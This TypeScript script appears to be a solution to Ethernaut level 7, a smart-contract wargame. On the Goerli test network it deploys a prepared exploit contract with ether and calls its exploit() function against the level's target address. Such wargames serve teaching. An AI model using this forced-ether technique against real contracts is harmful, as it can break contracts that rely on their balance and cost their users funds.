import ForceAddressJson from '../../../artifacts/contracts/level7/ForceAddress.sol/ForceAddress.json'
const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const forceContractAddress: string = '0x21B83aff44C66f511395d0490061c3F307ADbB7E';

// Define all function calls used
async function main(){
  console.log(`Ethernaut level 7 - script made by JoVi\n ------ `);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const forceAddressContractInterface = new ethers.ContractFactory(ForceAddressJson.abi, ForceAddressJson.bytecode, signer);
  console.log(`Deploying exploit contract.\n ------ `);
  const forceAddressContract = await forceAddressContractInterface.deploy( forceContractAddress, {value: '10000000000000000'});
  console.log(`Deployment succesfull.\n ------ `);

  console.log(`Attempting attack.\n ------ `);

  const attackTx = await forceAddressContract.exploit();
  const attackTxReceipt = await attackTx.wait();
  console.log(`Attack transaction has been pushed succesfully. Check transaction ${attackTxReceipt.hash} at goerli scan\n ------ `);
  
}


// Execute
main();